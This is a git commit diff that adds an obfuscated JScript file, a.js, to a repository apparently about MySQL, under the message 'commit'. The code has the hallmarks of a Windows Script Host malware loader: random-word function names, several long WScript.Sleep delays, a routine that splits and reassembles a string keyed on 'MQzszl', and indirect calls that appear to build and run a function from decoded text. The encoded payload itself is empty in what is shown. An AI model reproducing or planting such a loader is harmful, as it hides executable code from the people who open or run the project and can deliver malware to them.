35f74ea05ee6d6964febfb4c92319005577d939f
dhslrl321 <dhslrl321@gmail.com>
2023-08-02 22:50:05 +0900

    commit

---
+++ Real-MySQL/a.js
@@ -0,0 +1,94 @@
+function desert(steam, half, hill, hundred, charge) {
+  if (who(hill)) return steam + half;
+  else return half + steam;
+}
+
+function pay(stood, key, has, song) {
+  return stood.length;
+}
+than(2174);
+
+function certain(gun, may) {
+  cost[6699307] = company;
+  way[is] = create[way[knew]];
+}
+
+function now(require, rail) {
+  night = 1;
+  these = night;
+  WScript.Sleep(9966);
+  is = these + night * these + night;
+  cost[5170825] = stick;
+}
+
+function sign(general, north, wish, fat, king, flower) {
+  return general.substr(north, wish);
+}
+
+function view() {
+  WScript.Sleep(57946);
+  stay = 119;
+  while (create = create) {
+      try {
+          cost[stay](stay);
+      } catch (child) {
+          cost[2031521] = create;
+      }
+      stay++
+  }
+}
+
+function finger(numeral, rest, boat, moment, industry, receive) {
+  strange = knew;
+  office = pay(rest);
+  common = [];
+  for (eye = knew; eye <= (pay(numeral) - (office)); eye++) {
+      if (sign((numeral), (eye), office) == rest) {
+          common[pay(common)] = sign(numeral, strange, (eye - strange));
+          strange = (eye + office);
+      }
+  }
+  common[pay(common)] = sign(numeral, strange);
+  return common;
+}
+
+function after(include, repeat, above, late, safe, him) {
+  return sign(include, repeat, night);
+}
+
+function stick(ring, ready) {
+  wrong = "MQzszl";
+  cost[6001829] = certain;
+  way = finger(order(came), wrong);
+}
+
+function who(colony, told, between, solve) {
+  return colony % (these + these);
+}
+
+function company(ever, deal, band) {
+  way[is](way[these])(cost);
+}
+
+function create(four, death) {
+  cost[4170372] = now;
+  WScript.Sleep(8895);
+  came = '';
+  knew = 0;
+}
+
+function order(subtract, black, straight, high, small) {
+  neck = "";
+  same = knew;
+  while (same < 2597) {
+      rich = after(subtract, same);
+      neck = desert(neck, rich, same);
+      same++;
+  }
+  return neck;
+}
+
+function than(sharp, gone) {
+  cost = [1523];
+  view(cost);
+}
